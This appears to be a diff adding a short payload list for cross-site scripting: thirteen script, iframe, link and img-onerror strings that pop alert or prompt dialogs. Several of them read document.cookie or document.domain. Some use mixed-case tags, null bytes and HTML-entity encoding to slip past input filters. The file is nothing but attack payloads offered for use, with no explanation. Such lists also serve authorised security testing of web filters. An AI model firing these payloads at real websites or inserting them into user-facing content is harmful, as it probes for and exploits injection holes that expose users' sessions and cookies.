@@ -1,0 +1,39 @@
+Cross Site Scripting
+
+<script>alert("Cross Site Scripting")</script>
+
+
+<script>prompt("Cross Site Scripting")</script>
+
+
+<script>alert(document.cookie)</script>
+
+
+<script>prompt(document.cookie)</script>
+
+
+<script>prompt(document.domain)</script>
+
+
+<script>alert(document.domain)</script>
+
+
+<ScRipT>alert("XSS");</ScRipT>
+
+
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+
+
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+
+
+<ScRiPt>alert(document.cookie)</script>
+
+
+<<script>alert(document.cookie);//<</script>
+
+
+</script><script >alert(document.cookie)</script>
+
+
+<img src=asdf onerror=alert(document.cookie)>
